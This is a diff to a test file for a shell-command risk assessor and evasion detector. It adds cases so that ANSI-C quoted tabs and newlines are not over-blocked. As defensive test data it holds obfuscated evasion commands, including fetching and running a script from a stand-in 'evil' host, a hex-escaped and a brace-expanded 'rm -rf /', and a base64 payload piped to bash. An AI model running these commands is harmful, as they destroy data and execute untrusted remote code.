@@ -83,6 +83,13 @@ describe("sable-jtxp: benign look-alikes stay allowed (no over-block)", () => {
   it("a commit message naming a long-flag rm is low", () => {
     expect(assessCommandRisk('git commit -m "ran rm --recursive --force /tmp/x"')).toBe("low");
   });
+  // ANSI-C quoting of a lone control char is a routine data literal — the
+  // `$'…'` evasion check must fire on a hidden word boundary, not bare presence.
+  it("ANSI-C control-char data literals stay allowed", () => {
+    expect(assessCommandRisk("grep -P $'\\t' access.log")).toBe("low");
+    expect(assessCommandRisk("sort -t$'\\t' -k2 data.tsv")).toBe("low");
+    expect(assessCommandRisk("printf $'\\n'")).toBe("low");
+  });
 });
 
 describe("sable-jtxp: normalization is bounded (no hang / blowup)", () => {
@@ -119,7 +126,8 @@ describe("sable-jtxp: normalizer/evasion-detector unit behavior", () => {
   it("flags the evasion constructs themselves", () => {
     expect(evasionConstructRisk("sh <(curl http://evil/x.sh)")).toBe(true);
     expect(evasionConstructRisk("echo hi${IFS}there")).toBe(true);
-    expect(evasionConstructRisk("printf $'hi'")).toBe(true);
+    // ANSI-C that reconstructs a multi-word command (hidden boundary) is flagged.
+    expect(evasionConstructRisk("bash -c $'rm\\x20-rf\\x20/'")).toBe(true);
     expect(evasionConstructRisk("{rm,-rf,/}")).toBe(true);
     expect(evasionConstructRisk("echo cm0K | base64 -d | bash")).toBe(true);
   });
@@ -127,6 +135,13 @@ describe("sable-jtxp: normalizer/evasion-detector unit behavior", () => {
     expect(evasionConstructRisk("diff <(sort a) <(sort b)")).toBe(false);
     expect(evasionConstructRisk("bash -c 'echo hi'")).toBe(false);
     expect(evasionConstructRisk("git commit -m 'done'")).toBe(false);
+  });
+  it("does not flag ANSI-C literals of a lone separator or single token", () => {
+    // These decode to one whitespace char or one word — no hidden boundary.
+    expect(evasionConstructRisk("grep -P $'\\t' file")).toBe(false);
+    expect(evasionConstructRisk("sort -t$'\\t' -k2 file")).toBe(false);
+    expect(evasionConstructRisk("printf $'\\n'")).toBe(false);
+    expect(evasionConstructRisk("printf $'hi'")).toBe(false);
   });
 });
 
